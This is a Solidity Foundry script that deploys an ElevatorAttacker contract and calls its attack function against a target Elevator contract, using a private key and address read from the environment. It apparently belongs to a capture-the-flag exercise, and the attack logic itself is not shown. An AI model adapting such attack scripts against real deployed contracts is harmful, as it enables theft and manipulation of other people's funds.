// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/Test.sol";
import "../src/ElevatorAttacker.sol";

contract ElevatorAttackScript is Script {
    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PK");
        address elevatorAddress = vm.envAddress("ELEVATOR_ADDRESS");
        vm.startBroadcast(deployerPrivateKey);
        ElevatorAttacker attacker = new ElevatorAttacker();
        console.log("elevatorAddress: %s", elevatorAddress);
        attacker.attack(elevatorAddress);
        vm.stopBroadcast();
    }
}
